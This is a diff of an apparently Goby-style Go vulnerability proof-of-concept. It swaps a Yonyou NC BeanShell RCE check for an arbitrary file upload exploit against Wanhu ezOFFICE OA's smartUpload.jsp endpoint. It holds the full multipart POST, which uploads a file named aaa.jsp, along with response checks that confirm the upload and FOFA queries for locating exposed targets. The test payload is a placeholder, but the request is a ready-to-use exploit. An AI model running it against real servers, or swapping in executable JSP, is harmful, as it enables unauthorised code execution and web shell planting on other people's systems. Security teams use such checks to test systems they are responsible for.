@@ -6,14 +6,14 @@ import (
 
 func init() {
 	expJson := `{
-  "Name": "用友NC BeanShell RCE",
+  "Name": "万户OA smartUpload.jsp 任意文件上传漏洞",
   "Description": "",
   "Product": "",
   "Homepage": "",
   "DisclosureDate": null,
   "Author": "清晨",
-  "FofaQuery": "icon_hash=\"1085941792\" || product=\"Yonyou-UFIDA-NC\"",
-  "GobyQuery": "icon_hash=\"1085941792\" || product=\"Yonyou-UFIDA-NC\"",
+  "FofaQuery": "app=\"万户网络-ezOFFICE\" || product=\"万户网络-ezOFFICE\"",
+  "GobyQuery": "app=\"万户网络-ezOFFICE\" || product=\"万户网络-ezOFFICE\"",
   "Level": "3",
   "Impact": "",
   "Recommendation": "",
@@ -29,12 +29,14 @@ func init() {
     "AND",
     {
       "Request": {
-        "method": "GET",
-        "uri": "/servlet/~ic/bsh.servlet.BshServlet",
+        "method": "POST",
+        "uri": "/defaultroot/extension/smartUpload.jsp?path=information&fileName=infoPicName&saveName=infoPicSaveName&tableName=infoPicTable&fileMaxSize=0&",
         "follow_redirect": true,
-        "header": {},
+        "header": {
+          "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarynNQ8hoU56tfSwBVU"
+        },
         "data_type": "text",
-        "data": ""
+        "data": "------WebKitFormBoundarynNQ8hoU56tfSwBVU\nContent-Disposition: form-data; name=\"photo\"; filename=\"aaa.jsp\"\nContent-Type: application/octet-stream\n\naaaaa\n------WebKitFormBoundarynNQ8hoU56tfSwBVU\nContent-Disposition: form-data; name=\"continueUpload\"\n\n1\n------WebKitFormBoundarynNQ8hoU56tfSwBVU\nContent-Disposition: form-data; name=\"submit\"\n\n上传继续\n------WebKitFormBoundarynNQ8hoU56tfSwBVU--"
       },
       "ResponseTest": {
         "type": "group",
@@ -51,7 +53,14 @@ func init() {
             "type": "item",
             "variable": "$body",
             "operation": "contains",
-            "value": "BeanShell",
+            "value": "infoPicSaveName",
+            "bz": ""
+          },
+          {
+            "type": "item",
+            "variable": "$body",
+            "operation": "contains",
+            "value": "aaa.jsp",
             "bz": ""
           }
         ]
@@ -107,7 +116,7 @@ func init() {
   "CVSSScore": "",
   "Translation": {
     "CN": {
-      "Name": "用友NC BeanShell RCE",
+      "Name": "万户OA smartUpload.jsp 任意文件上传漏洞",
       "Product": "",
       "Description": "",
       "Recommendation": "",
@@ -116,7 +125,7 @@ func init() {
       "Tags": []
     },
     "EN": {
-      "Name": "yonyou NC BeanShell RCE",
+      "Name": "ezOFFICE OA smartUpload.jsp upload file",
       "Product": "",
       "Description": "",
       "Recommendation": "",
